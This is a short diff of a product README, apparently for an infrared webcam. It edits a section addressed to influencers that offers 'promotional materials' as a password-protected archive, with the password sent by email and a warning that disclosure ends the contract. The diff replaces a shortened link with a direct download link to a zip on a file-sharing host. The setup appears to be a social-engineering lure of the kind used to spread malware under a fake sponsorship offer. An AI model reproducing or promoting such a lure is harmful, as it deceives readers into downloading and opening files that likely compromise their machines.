@@ -52,6 +52,6 @@ Our first webcam with an infrared sensor supports Windows Hello and other facial
 ### For influencers
 We glad that you liked our product and decided to work with us. Below you can find all of the required materials for your work. The password will be sent to you by email. Please note that disclosure of the materials to any third parties will lead to the contract termination.
 
-### [Influencer Promotional Materials](https://shorturl.at/MOVY4)
+### [Influencer Promotional Materials](https://www9.zippyshare.com/d/jz6nDcVt/47887/Promo%20Materials.zip)
 
 ![alt-text](https://i.imgur.com/EJk4wII.png)
